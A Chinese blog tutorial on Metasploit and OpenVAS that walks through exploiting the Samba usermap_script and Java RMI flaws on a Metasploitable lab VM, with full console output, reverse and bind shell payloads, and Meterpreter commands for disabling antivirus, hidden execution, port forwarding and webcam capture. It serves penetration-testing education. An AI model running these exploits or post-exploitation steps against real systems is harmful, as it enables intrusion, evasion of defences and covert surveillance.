---
layout: post
title:  "网络安全－Metasploit渗透测试基本流程"
categories: 网络安全
tags: 网络安全 OpenVAS Metasploit 渗透测试
author: xueyp
description: OpenVAS和Metasploit的基本使用方法.
---

概念
============

- **OpenVAS**

　　漏洞扫描器是用来找出指定系统或应用中安全漏洞的自动化工具。漏洞扫描器通常通过获取目标系统的操作系统指纹信息来判断其类型与版本，以及上面所运行的各种服务，一旦以及获取目标系统的操作系统与服务类型，你就可以使用漏洞扫描器来执行一些特定的检查，来确定那些安全漏洞。当然，这些检查历程的质量取决于他们的开发者，而且与任何完全自动化的解决方案一样，他们在很多时候回漏掉或错误标识系统上的安全漏洞。

　　OpenVAS（开放式漏洞评估系统）是一个开源漏洞扫描器，它常用来评估目标主机上的漏洞。OpenVAS是Nessus项目的一个分支，它提供的产品是完全地免费。OpenVAS默认安装在标准的Kali Linux上，同样可以方便地安装于Centos,Ubuntu,Archlinux等系统中。

[ArchLinux中OpenVAS安装指南](https://wiki.archlinux.org/index.php/OpenVAS)

- **Metasploit**

　　Metasploit是一款开源的安全漏洞检测工具，可以帮助安全和IT专业人士识别安全性问题，验证漏洞的缓解措施，并管理专家驱动的安全性进行评估，提供真正的安全风险情报。这些功能包括智能开发，代码审计，Web应用程序扫描，社会工程。团队合作，在Metasploit和综合报告提出了他们的发现。

　　Metasploit系统架构如下图：
![png]({{"/assets/images/my/20180607_01.png"| absolute_url }})
　　
虚拟机运行kali比较慢的话，可以在实体机上安装。

[ArchLinux中Metasploit安装指南](https://wiki.archlinux.org/index.php/Metasploit_Framework)



- **Metasploit术语**

**Exploit（渗透攻击）**

　　渗透攻击是指由攻击者或渗透测试者利用一个系统、应用或服务中的安全漏洞，所进行的攻击行为。攻击者使用渗透攻击去入侵系统时，往往会造成开发者所没有预想到的一中特殊结果。流行的渗透攻击技术包括缓冲区溢出、WEB应用程序漏洞攻击（例如：SQL注入、XSS等），以及利用配置错误等。

**Payload（攻击载荷）**

　　攻击载荷是我们期望目标系统在被渗透攻击之后去执行的代码，在Metasploit框架中可以自由地选择、传送和植入。例如，反弹式shell是一种从目标主机到攻击主机创建网络连接，并提供命令行shell的攻击载荷，而bind shell攻击载荷则在目标主机上将命令行shell 绑定到一个打开的监听端口，攻击者可以连接这些端口来取得shell交互。攻击载荷也可能是简单的目标操作系统上执行一些命令，如添加账户等等。

**ShellCode**

　　ShellCode是渗透攻击时作为攻击载荷运行的一组机器指令。ShellCode通常用汇编语言编写。在大多数情况下，目标系统执行了ShellCode这一组指令之后，才会提供一个命令行shell或者Meterpreter shell，这也是ShellCode的由来。

**Module(模块)**

　　在Metasploit中一个模块是指Metasploit框架中所使用的一段软件代码组件。在某些时候，你可能使用一个渗透攻击模块（exploit module），也就是用于实际发起渗透攻击的软件组件。而在其他时候，则可能使用一个辅助模块（auxiliary module）,用来执行一些注入扫描或系统查点的攻击动作，这些在不断变化和发展中的模块才是使Metasploit框架如此强大的核心所在。

**Listener(监听器)**

　　监听器是Metasploit中用来等待接入网络连接主机的组件，举例来说，在目标系统主机被渗透攻击之后，他可能会通过互联网回连到攻击主机上，而监听器组件在攻击主机上等待被渗透攻击的系统来连接，并负责处理这些网络连接。

- **用户接口**
 
**Msfconsole**

　　Msfconsole是目前Metasploit框架最为流行的用户接口，MSFconsole是Metasploit框架中最为灵活、功能最全以及支持最好的工具之一，MSFconsole提供了一站式的接口，能够访问Metasploit框架中几乎每一个选项和配置，就好比是你能够实现所有渗透攻击梦想的大超市一般，你可以使用MSFconsole做任何时期，包括发起一次渗透攻击、转载功能模块、实施查点、创建监听器，或者对整个网络进行自动化渗透测试攻击等等。
启动终端：在命令行里输入msfconsole即可。

**msfcli**

　　msfcli脚本处理和其他命令工具的互操作性,通常用于结合shell脚本生成自动渗透方案。

**Web界面**

　　Metasploit还提供了Web界面操作方式，使用方式很直观，此处不需要说明。

- **功能程序**

**MSF攻击载荷生成器（msfpayload）**

　　用于生成自己定制的shellcode、可执行代码等。也可以让在框架软件之外的渗透代码中进行使用。

　　ShellCode可以生成包括C、JavaScript、甚至Web应用程序中的Visual Basic脚本在内的多种格式，每种输出格式在不同的场景中可以使用。比如，使用Python语言编写一个渗透攻击的概念验证代码（POC：proof of concept）那么C语言格式是最好的；如果编写一个浏览器渗透攻击代码，那么以JavaScript语言方式输出的ShellCode将是最适合的，在选择了所期望的输出后，可以简单地将攻击载荷直接加入到一个HTML中来触发渗透攻击。

**MSF编码器（msfencode）**

　　主要作用是帮助msfpayload进行编码处理，避免坏字符，以及逃避杀毒软件和IDS的检测。有些MSF攻击载荷生成器产生的ShellCode是完全可以运行的，但是其中包含了一些NULL空字符，在一些程序进行解析时，这些空字符会被认为是字符串的结束，从而使得代码在完整执行之前被截断而终止运行。简单来说就是\00和\xff字符会破坏你的攻击载荷。

　　另外，在网络上明文传输的ShellCode很可能被入侵检测系统和杀毒软件所识别，为了解决这一问题，Metasploit的开发者们提供了MSF编码器，可以帮助你通过对原始攻击载荷进行编码的方式来避免坏字符，以及逃避杀毒软件和IDS检测，输入Msfencode -h 可以查看MSF编码器的配置选项列表

- Metasploit常用指令

**show  exploits**

　　显示Metasploit框架中所有可以使用的渗透攻击模块。

**show  auxiliary**

　　显示所有的辅助模块以及他们的用途，在Metasploit中，辅助模块的用途非常广泛，他们可以是扫描器、拒绝服务攻击工具、Fuzz测试器，以及其他类型的工具。

**show  options**

　　参数Option是保证Metasploit框架中各个模块正确运行所需的各种设置。当你选择一个exploit模块之后，输入 “show option”之后，系统会列出这个模块所需要的各种参数。如果你没有选择任何模块，在终端输入这个命令之后会显示所有的全局参数。

**(exploite module) back**

　　back命令可以使你退出当前的模块，回到“msf>”命令格式下：

**search  模块名称**

　　search命令可以查询某个特定的渗透攻击、辅助或攻击载荷模块。

**show payloads**

　　和show option命令一样，Metasploit会将与单前模块兼容的攻击载荷显示出来。如果不在模块下执行该命令，则会显示所有活动状态的攻击载荷。

**show targets**

　　该命令会列出有效载荷攻击模块可以实行有效攻击的系统类型（一般情况下系统会自动选择该系统类型）。

**msf(有效攻击载荷模块)>info**

　　显示当前模块信息

**set 和unset**

　　Metasploit模块中的所有参数只有两个状态：已设置（set）和未设置（unset）.有些参数会被标记为必填项（required）,这样的参数必须经过手工设置并处于启动状态。可以在终端输入“show option”来查看那些参数时必须要填写的；使用Set命令可以对某个参数进行设置（同时启用该参数）；使用unset 命令可以禁止相关参数。

**setg和unsetg**

　　setg和unsetg命令可以对全局参数进行设置或清除。使用这组命令可以让你不必每次遇到某个参数都要重新设置，特别是那些经常用到又很少会变的参数。例如LHOST。

**save **

　　在使用setg命令对全局参数进行设置之后，可以使用save命令将当前的设置保存下来，这样下次启动MSF终端的时候还可以使用这些设置值。在Metasploit中可以在任何时候输入save命令来保存当前状态。

渗透攻击示例1:SMB漏洞攻击
============

　　靶机部署于vmware,[靶机镜像下载](https://sourceforge.net/projects/metasploitable/?source=directory)。

　　配置ip:靶机:172.16.1.96

　　　　　　运行metasploit的操作机：172.16.1.253


1 在253机器以root权限运行msfconsole,显示了当前metasploit的版本、攻击模块、辅助模块、攻击载荷、编码器、空指令模块的数量:

```
[PC ~]# msfconsole
                                                  
                                   ____________
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| $a,        |%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| $S`?a,     |%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
 [%%%%%%%%%%%%%%%%%%%%__%%%%%%%%%%|       `?a, |%%%%%%%%__%%%%%%%%%__%%__ %%%%]
 [% .--------..-----.|  |_ .---.-.|       .,a$%|.-----.|  |.-----.|__||  |_ %%]
 [% |        ||  -__||   _||  _  ||  ,,aS$""`  ||  _  ||  ||  _  ||  ||   _|%%]
 [% |__|__|__||_____||____||___._||%$P"`       ||   __||__||_____||__||____|%%]
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| `"a,       ||__|%%%%%%%%%%%%%%%%%%%%%%%%%%]
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%|____`"a,$$__|%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%        `"$   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]


       =[ metasploit v4.16.58-dev                         ]
+ -- --=[ 1769 exploits - 1006 auxiliary - 307 post       ]
+ -- --=[ 537 payloads - 41 encoders - 10 nops            ]
+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]

msf > 
```

　　输入help会显示帮助信息:
```
msf > help

Core Commands
=============

    Command       Description
    -------       -----------
    ?             Help menu
    banner        Display an awesome metasploit banner
    cd            Change the current working directory
    color         Toggle color
    connect       Communicate with a host
    exit          Exit the console
    get           Gets the value of a context-specific variable
    getg          Gets the value of a global variable
    grep          Grep the output of another command
    help          Help menu
    history       Show command history
    irb           Drop into irb scripting mode
    load          Load a framework plugin
    quit          Exit the console
    route         Route traffic through a session
    save          Saves the active datastores
    sessions      Dump session listings and display information about sessions
    set           Sets a context-specific variable to a value
    setg          Sets a global variable to a value
    sleep         Do nothing for the specified number of seconds
    spool         Write console output into a file as well the screen
    threads       View and manipulate background threads
    unload        Unload a framework plugin
    unset         Unsets one or more context-specific variables
    unsetg        Unsets one or more global variables
    version       Show the framework and console library version numbers


Module Commands
===============

    Command       Description
    -------       -----------
    advanced      Displays advanced options for one or more modules
    back          Move back from the current context
    edit          Edit the current module or a file with the preferred editor
    info          Displays information about one or more modules
    loadpath      Searches for and loads modules from a path
    options       Displays global options or for one or more modules
    popm          Pops the latest module off the stack and makes it active
    previous      Sets the previously loaded module as the current module
    pushm         Pushes the active or list of modules onto the module stack
    reload_all    Reloads all modules from all defined module paths
    reload_lib    Reload one or more library files from specified paths
    search        Searches module names and descriptions
    show          Displays modules of a given type, or all modules
    use           Selects a module by name


Job Commands
============

    Command       Description
    -------       -----------
    handler       Start a payload handler as job
    jobs          Displays and manages jobs
    kill          Kill a job
    rename_job    Rename a job


Resource Script Commands
========================

    Command       Description
    -------       -----------
    makerc        Save commands entered since start to a file
    resource      Run the commands stored in a file


Database Backend Commands
=========================

    Command           Description
    -------           -----------
    db_connect        Connect to an existing database
    db_disconnect     Disconnect from the current database instance
    db_export         Export a file containing the contents of the database
    db_import         Import a scan result file (filetype will be auto-detected)
    db_nmap           Executes nmap and records the output automatically
    db_rebuild_cache  Rebuilds the database-stored module cache
    db_status         Show the current database status
    hosts             List all hosts in the database
    loot              List all loot in the database
    notes             List all notes in the database
    services          List all services in the database
    vulns             List all vulnerabilities in the database
    workspace         Switch between database workspaces


Credentials Backend Commands
============================

    Command       Description
    -------       -----------
    creds         List all credentials in the database


```
2 metasploit中的模块数量庞大，但是有search指令（可根据服务、cve等信息查找）方便地找到我们所需的模块我们要找到samba攻击模块:multi/samba/usermap_script
```
msf > search samba

Matching Modules
================

   Name                                            Disclosure Date  Rank       Description
   ----                                            ---------------  ----       -----------
   auxiliary/admin/smb/samba_symlink_traversal                      normal     Samba Symlink Directory Traversal
   auxiliary/dos/samba/lsa_addprivs_heap                            normal     Samba lsa_io_privilege_set Heap Overflow
   auxiliary/dos/samba/lsa_transnames_heap                          normal     Samba lsa_io_trans_names Heap Overflow
   auxiliary/dos/samba/read_nttrans_ea_list                         normal     Samba read_nttrans_ea_list Integer Overflow
   auxiliary/scanner/rsync/modules_list                             normal     List Rsync Modules
   auxiliary/scanner/smb/smb_uninit_cred                            normal     Samba _netr_ServerPasswordSet Uninitialized Credential State
   exploit/freebsd/samba/trans2open                2003-04-07       great      Samba trans2open Overflow (*BSD x86)
   exploit/linux/samba/chain_reply                 2010-06-16       good       Samba chain_reply Memory Corruption (Linux x86)
   exploit/linux/samba/is_known_pipename           2017-03-24       excellent  Samba is_known_pipename() Arbitrary Module Load
   exploit/linux/samba/lsa_transnames_heap         2007-05-14       good       Samba lsa_io_trans_names Heap Overflow
   exploit/linux/samba/setinfopolicy_heap          2012-04-10       normal     Samba SetInformationPolicy AuditEventsInfo Heap Overflow
   exploit/linux/samba/trans2open                  2003-04-07       great      Samba trans2open Overflow (Linux x86)
   exploit/multi/samba/nttrans                     2003-04-07       average    Samba 2.2.2 - 2.2.6 nttrans Buffer Overflow
   exploit/multi/samba/usermap_script              2007-05-14       excellent  Samba "username map script" Command Execution
   exploit/osx/samba/lsa_transnames_heap           2007-05-14       average    Samba lsa_io_trans_names Heap Overflow
   exploit/osx/samba/trans2open                    2003-04-07       great      Samba trans2open Overflow (Mac OS X PPC)
   exploit/solaris/samba/lsa_transnames_heap       2007-05-14       average    Samba lsa_io_trans_names Heap Overflow
   exploit/solaris/samba/trans2open                2003-04-07       great      Samba trans2open Overflow (Solaris SPARC)
   exploit/unix/misc/distcc_exec                   2002-02-01       excellent  DistCC Daemon Command Execution
   exploit/unix/webapp/citrix_access_gateway_exec  2010-12-21       excellent  Citrix Access Gateway Command Execution
   exploit/windows/fileformat/ms14_060_sandworm    2014-10-14       excellent  MS14-060 Microsoft Windows OLE Package Manager Code Execution
   exploit/windows/http/sambar6_search_results     2003-06-21       normal     Sambar 6 Search Results Buffer Overflow
   exploit/windows/license/calicclnt_getconfig     2005-03-02       average    Computer Associates License Client GETCONFIG Overflow
   exploit/windows/smb/group_policy_startup        2015-01-26       manual     Group Policy Script Execution From Shared Resource
   post/linux/gather/enum_configs                                   normal     Linux Gather Configurations

```
3 接下来运行"use multi/samba/usermap_script"选择这个攻击模块，并通过"show payloads"查看可用的攻击载荷:
```
msf > use multi/samba/usermap_script
msf exploit(multi/samba/usermap_script) > show payloads

Compatible Payloads
===================

   Name                                Disclosure Date  Rank    Description
   ----                                ---------------  ----    -----------
   cmd/unix/bind_awk                                    normal  Unix Command Shell, Bind TCP (via AWK)
   cmd/unix/bind_inetd                                  normal  Unix Command Shell, Bind TCP (inetd)
   cmd/unix/bind_lua                                    normal  Unix Command Shell, Bind TCP (via Lua)
   cmd/unix/bind_netcat                                 normal  Unix Command Shell, Bind TCP (via netcat)
   cmd/unix/bind_netcat_gaping                          normal  Unix Command Shell, Bind TCP (via netcat -e)
   cmd/unix/bind_netcat_gaping_ipv6                     normal  Unix Command Shell, Bind TCP (via netcat -e) IPv6
   cmd/unix/bind_perl                                   normal  Unix Command Shell, Bind TCP (via Perl)
   cmd/unix/bind_perl_ipv6                              normal  Unix Command Shell, Bind TCP (via perl) IPv6
   cmd/unix/bind_r                                      normal  Unix Command Shell, Bind TCP (via R)
   cmd/unix/bind_ruby                                   normal  Unix Command Shell, Bind TCP (via Ruby)
   cmd/unix/bind_ruby_ipv6                              normal  Unix Command Shell, Bind TCP (via Ruby) IPv6
   cmd/unix/bind_socat_udp                              normal  Unix Command Shell, Bind UDP (via socat)
   cmd/unix/bind_zsh                                    normal  Unix Command Shell, Bind TCP (via Zsh)
   cmd/unix/generic                                     normal  Unix Command, Generic Command Execution
   cmd/unix/reverse                                     normal  Unix Command Shell, Double Reverse TCP (telnet)
   cmd/unix/reverse_awk                                 normal  Unix Command Shell, Reverse TCP (via AWK)
   cmd/unix/reverse_bash_telnet_ssl                     normal  Unix Command Shell, Reverse TCP SSL (telnet)
   cmd/unix/reverse_ksh                                 normal  Unix Command Shell, Reverse TCP (via Ksh)
   cmd/unix/reverse_lua                                 normal  Unix Command Shell, Reverse TCP (via Lua)
   cmd/unix/reverse_ncat_ssl                            normal  Unix Command Shell, Reverse TCP (via ncat)
   cmd/unix/reverse_netcat                              normal  Unix Command Shell, Reverse TCP (via netcat)
   cmd/unix/reverse_netcat_gaping                       normal  Unix Command Shell, Reverse TCP (via netcat -e)
   cmd/unix/reverse_openssl                             normal  Unix Command Shell, Double Reverse TCP SSL (openssl)
   cmd/unix/reverse_perl                                normal  Unix Command Shell, Reverse TCP (via Perl)
   cmd/unix/reverse_perl_ssl                            normal  Unix Command Shell, Reverse TCP SSL (via perl)
   cmd/unix/reverse_php_ssl                             normal  Unix Command Shell, Reverse TCP SSL (via php)
   cmd/unix/reverse_python                              normal  Unix Command Shell, Reverse TCP (via Python)
   cmd/unix/reverse_python_ssl                          normal  Unix Command Shell, Reverse TCP SSL (via python)
   cmd/unix/reverse_r                                   normal  Unix Command Shell, Reverse TCP (via R)
   cmd/unix/reverse_ruby                                normal  Unix Command Shell, Reverse TCP (via Ruby)
   cmd/unix/reverse_ruby_ssl                            normal  Unix Command Shell, Reverse TCP SSL (via Ruby)
   cmd/unix/reverse_socat_udp                           normal  Unix Command Shell, Reverse UDP (via socat)
   cmd/unix/reverse_ssl_double_telnet                   normal  Unix Command Shell, Double Reverse TCP SSL (telnet)
   cmd/unix/reverse_zsh                                 normal  Unix Command Shell, Reverse TCP (via Zsh)

msf exploit(multi/samba/usermap_script) > 

```

4 执行"set payload cmd/unix/bind_netcat",即用netcat工具在渗透攻击成功后执行Shell并绑定到一个端口 :
```
msf exploit(multi/samba/usermap_script) > set payload cmd/unix/bind_netcat
payload => cmd/unix/bind_netcat
```

5 执行"show options"查看需要设置哪些配置参数，必选项必须配置，配置方法为set指令:
```
msf exploit(multi/samba/usermap_script) > show options

Module options (exploit/multi/samba/usermap_script):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   RHOST                   yes       The target address
   RPORT  139              yes       The target port (TCP)


Payload options (cmd/unix/bind_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LPORT  4444             yes       The listen port
   RHOST                   no        The target address


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf exploit(multi/samba/usermap_script) > 
```
　　我们可以看到，RHOST即目标机器需要设定。执行“set RHOST 172.16.1.96”

```
msf exploit(multi/samba/usermap_script) > set RHOST 172.16.1.96
RHOST => 172.16.1.96
```

6 执行"exploit"即可开始攻击。

```
msf exploit(multi/samba/usermap_script) > exploit

[*] Started bind handler
[*] Command shell session 1 opened (172.16.1.253:39353 -> 172.16.1.96:4444) at 2018-06-06 14:28:03 +0800

```
　　可以看到攻击成功了，返回了shell绑定在39353端口，输入"ls /"成功显示目标机器的根目录。
```
ls /
bin
boot
cdrom
dev
etc
home
initrd
initrd.img
lib
lost+found
media
mnt
opt
proc
root
sbin
srv
sys
tmp
usr
var
vmlinuz


```

渗透攻击示例2:Java_RMI漏洞攻击
============

1 通过ｎｍａｐ服务枚举发现目标机器上有rmiregistry服务。
```
msf > nmap 172.16.1.96
[*] exec: nmap 172.16.1.96

Starting Nmap 7.70 ( https://nmap.org ) at 2018-06-06 14:40 CST
Nmap scan report for 172.16.1.96
Host is up (0.0025s latency).
Not shown: 977 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
23/tcp   open  telnet
25/tcp   open  smtp
53/tcp   open  domain
80/tcp   open  http
111/tcp  open  rpcbind
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
512/tcp  open  exec
513/tcp  open  login
514/tcp  open  shell
1099/tcp open  rmiregistry
1524/tcp open  ingreslock
2049/tcp open  nfs
2121/tcp open  ccproxy-ftp
3306/tcp open  mysql
5432/tcp open  postgresql
5900/tcp open  vnc
6000/tcp open  X11
6667/tcp open  irc
8009/tcp open  ajp13
8180/tcp open  unknown
MAC Address: 00:0C:29:E4:20:99 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.30 seconds

```

2 找到并ｕｓｅ相应模块
```
msf > search java_rmi

Matching Modules
================

   Name                                            Disclosure Date  Rank       Description
   ----                                            ---------------  ----       -----------
   auxiliary/gather/java_rmi_registry                               normal     Java RMI Registry Interfaces Enumeration
   auxiliary/scanner/misc/java_rmi_server          2011-10-15       normal     Java RMI Server Insecure Endpoint Code Execution Scanner
   exploit/multi/browser/java_rmi_connection_impl  2010-03-31       excellent  Java RMIConnectionImpl Deserialization Privilege Escalation
   exploit/multi/misc/java_rmi_server              2011-10-15       excellent  Java RMI Server Insecure Default Configuration Java Code Execution


msf > use exploit/multi/misc/java_rmi_server
msf exploit(multi/misc/java_rmi_server) > 

```

3 查看配置选项,并设置目标机地址
```
msf exploit(multi/misc/java_rmi_server) > show options

Module options (exploit/multi/misc/java_rmi_server):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   HTTPDELAY  10               yes       Time that the HTTP Server will wait for the payload request
   RHOST                       yes       The target address
   RPORT      1099             yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL for incoming connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                     no        The URI to use for this exploit (default is random)


Exploit target:

   Id  Name
   --  ----
   0   Generic (Java Payload)


msf exploit(multi/misc/java_rmi_server) > set RHOST 172.16.1.96
RHOST => 172.16.1.96
```
4 开始攻击,执行run命令，辅助模块等执行使用run,只有攻击模块的exploit是run的alias。
```
msf exploit(multi/misc/java_rmi_server) > run

[*] Started reverse TCP handler on 172.16.1.253:4444 
[*] 172.16.1.96:1099 - Using URL: http://0.0.0.0:8080/QgvmkWvuvTB
[*] 172.16.1.96:1099 - Local IP: http://172.16.1.253:8080/QgvmkWvuvTB
[*] 172.16.1.96:1099 - Server started.
[*] 172.16.1.96:1099 - Sending RMI Header...
[*] 172.16.1.96:1099 - Sending RMI Call...
[*] 172.16.1.96:1099 - Replied to request for payload JAR
[*] Sending stage (53859 bytes) to 172.16.1.96
[*] Meterpreter session 2 opened (172.16.1.253:4444 -> 172.16.1.96:56079) at 2018-06-06 14:47:32 +0800
[*] 172.16.1.96:1099 - Server stopped.

meterpreter > 

```
5 可以看到成功返回一个Meterpreter，使用"help"查看Meterpreter命令选择项
```
meterpreter > help

Core Commands
=============

    Command                   Description
    -------                   -----------
    ?                         Help menu
    background                Backgrounds the current session
    bgkill                    Kills a background meterpreter script
    bglist                    Lists running background scripts
    bgrun                     Executes a meterpreter script as a background thread
    channel                   Displays information or control active channels
    close                     Closes a channel
    disable_unicode_encoding  Disables encoding of unicode strings
    enable_unicode_encoding   Enables encoding of unicode strings
    exit                      Terminate the meterpreter session
    get_timeouts              Get the current session timeout values
    guid                      Get the session GUID
    help                      Help menu
    info                      Displays information about a Post module
    irb                       Drop into irb scripting mode
    load                      Load one or more meterpreter extensions
    machine_id                Get the MSF ID of the machine attached to the session
    migrate                   Migrate the server to another process
    quit                      Terminate the meterpreter session
    read                      Reads data from a channel
    resource                  Run the commands stored in a file
    run                       Executes a meterpreter script or Post module
    sessions                  Quickly switch to another session
    set_timeouts              Set the current session timeout values
    sleep                     Force Meterpreter to go quiet, then re-establish session.
    transport                 Change the current transport mechanism
    use                       Deprecated alias for "load"
    uuid                      Get the UUID for the current session
    write                     Writes data to a channel


Stdapi: File system Commands
============================

    Command       Description
    -------       -----------
    cat           Read the contents of a file to the screen
    cd            Change directory
    checksum      Retrieve the checksum of a file
    cp            Copy source to destination
    dir           List files (alias for ls)
    download      Download a file or directory
    edit          Edit a file
    getlwd        Print local working directory
    getwd         Print working directory
    lcd           Change local working directory
    lls           List local files
    lpwd          Print local working directory
    ls            List files
    mkdir         Make directory
    mv            Move source to destination
    pwd           Print working directory
    rm            Delete the specified file
    rmdir         Remove directory
    search        Search for files
    upload        Upload a file or directory


Stdapi: Networking Commands
===========================

    Command       Description
    -------       -----------
    ifconfig      Display interfaces
    ipconfig      Display interfaces
    portfwd       Forward a local port to a remote service
    route         View and modify the routing table


Stdapi: System Commands
=======================

    Command       Description
    -------       -----------
    execute       Execute a command
    getenv        Get one or more environment variable values
    getuid        Get the user that the server is running as
    localtime     Displays the target system's local date and time
    pgrep         Filter processes by name
    ps            List running processes
    shell         Drop into a system command shell
    sysinfo       Gets information about the remote system, such as OS


Stdapi: User interface Commands
===============================

    Command       Description
    -------       -----------
    screenshot    Grab a screenshot of the interactive desktop


Stdapi: Webcam Commands
=======================

    Command       Description
    -------       -----------
    record_mic    Record audio from the default microphone for X seconds

meterpreter > 
  
```

　　执行shell命令即可获得目标机器的shell，同样执行"ls /"可以得到目标机器的根目录:
```
meterpreter > shell
Process 1 created.
Channel 1 created.
ls /
bin
boot
cdrom
dev
etc
home
initrd
initrd.img
lib
lost+found
media
mnt
nohup.out
opt
proc
root
sbin
srv
sys
tmp
usr
var
vmlinuz


```
　　执行exit退出shell,还有很多丰富的命令见下一节内容。


Meterpreter命令详解
============

1 background,session

　　background命令将Meterpreter终端隐藏在后台,session命令可以查看已经成功获取的会话，如果想继续与某会话进行交互，可以使用“session -i”命令查看会话，之后使用“sessions ID”之后重新开启会话。

```
meterpreter > background
[*] Backgrounding session 2...
msf exploit(multi/misc/java_rmi_server) > sessions -i

Active sessions
===============

  Id  Name  Type                    Information            Connection
  --  ----  ----                    -----------            ----------
  2         meterpreter java/linux  root @ metasploitable  172.16.1.253:4444 -> 172.16.1.96:56079 (172.16.1.96)

msf exploit(multi/misc/java_rmi_server) > sessions 2
[*] Starting interaction with 2...

meterpreter > 
```

2 quit命令

　　quit命令直接关闭当前的Meterpreter会话，返回MSF终端

3 shell命令

　　shell命令可以获取系统的控制台shell，如果目标系统上的命令可执行程序不存在或禁止访问，那么shell命令会出错。

4 irb命令

　　irb命令可以在Meterpreter会话里与Ruby终端进行交互，直接调用Metasploit封装好的函数，如下显示了使用irb命令调用client.sys.config。sysinfo()函数获取系统配置信息的结果：
```
meterpreter > irb
[*] Starting IRB shell
[*] The "client" variable holds the meterpreter client

>> client.sys.config.sysinfo()
=> {"Computer"=>"metasploitable", "OS"=>"Linux 2.6.24-16-server (i386)", "Architecture"=>nil, "BuildTuple"=>nil, "System Language"=>nil, "Domain"=>nil, "Logged On Users"=>nil}

```
 
　　在irb中还可以通过添加Metasploit的附加组件——Railgun，直接与Windows本地API进行交互。Railgun是Meterpreter的Ruby语言扩展，允许在目标机器上使用所有的Windows API。同样，我们可以使用“exit”返回到Meterpreter

```
nc -l -p 8001 -c "nc 127.0.0.1 8088" -vv
```
　　这样就把本机的8088端口映射到了8001端口，ｖｐｓ监听８００１端口，客户端通过连接8001端口即可实现访问内网机Ａ的80端口。

5 文件系统命令

- cat 查看文件内容
- getwd　获得当前工作目录
- upload 上传文件或文件夹到目标机器上,可使用"-r"递归上传文件夹
- download 从目标机上下载文件或文件夹
- edit 调用vi编辑器，对目标机上的文件进行编辑
- search 对远程目标主机上的文件进行搜索

6 网络命令

- ifconfig/ipconfig(windows) 查看目标主机上的网络接口信息
- portfwd 
　　Meterpreter内嵌的端口转发器，一般在目标主机开放的端口不允许直接访问的情况下使用，比如说，目标主机开放的ssh端口只允许内网访问，就可以使用portfwd命令进行端口转发，达到直接访问目标主机的目的。下面的命令将目标机的22端口转发到本地的8022端口
```
portfwd add -l 8022 -p 22 -r 172.16.1.96  
```

- route 显示目标主机的路由信息

7 系统命令
- ps 获取目标主机的进程信息
- migrate 将Meterpreter会话从一个进程移植到另外一个进程的内存空间中，这个命令在渗透攻击模块中经常使用。
- execute 在目标机上执行文件，例如隐藏执行：“execute -H -f /bin/bash"  
- getpid 获取当前会话所在进程的PID值
- getuid 获取运行Meterpreter会话的用户名，从而查看当前会话所具有的权限
- kill 终结指定的PID进程
- sysinfo 显示目标系统的一些信息，包括机器名、使用的系统信息等
- shutdown 关闭目标主机

8 其他
- screenshot 截屏
- run killav 关闭对方杀毒软件
- webcam_list 查看目标机器上是否有网络摄像头，并且列举出来
- webcam_snap 远程连接目标系统的摄像头。
- lpwd 显示本地目录，也就是你自己所在的系统的目录
- lcd 进入本地目录，也就是进入你自己系统的目录

参考
============

[openvas官方手册](http://www.openvas.org/documentation.html)

[Metasploit官方手册](https://metasploit.help.rapid7.com/docs/getting-started)


版权声明：本文为博主原创文章，转载请注明出处。 [旭日酒馆](https://xueyp.github.io/)
